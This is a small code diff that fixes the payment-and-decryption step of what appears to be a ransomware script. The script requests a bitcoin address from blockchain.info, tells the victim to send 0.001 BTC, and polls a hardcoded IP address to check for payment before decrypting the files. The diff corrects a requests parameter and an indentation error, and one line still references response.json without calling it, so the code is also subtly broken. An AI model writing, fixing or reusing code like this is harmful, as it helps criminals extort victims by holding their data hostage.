@@ -39,7 +39,7 @@ params = {
           "callback": "www.exampleserver"
           }
 
-response = requests.get("http://blockchain.info/api/receive", params)
+response = requests.get("http://blockchain.info/api/receive", params=params)
 jsonResponse = response.json()
 print("Send 0.001btc to"+ jsonResponse["input_address"])
 time.sleep(3)
@@ -50,7 +50,7 @@ for i in range(108):
     responsePaid = requests.get("http://79.170.40.237/bot.com/code/checker.php")
     jsonPaid = responsePaid.json
     if jsonPaid["paid"]== 1:
-       encryptionManager.manage(1, rootDirectionary, key) #decypts the files.
+        encryptionManager.manage(1, rootDirectionary, key) #decypts the files.
 
 
 
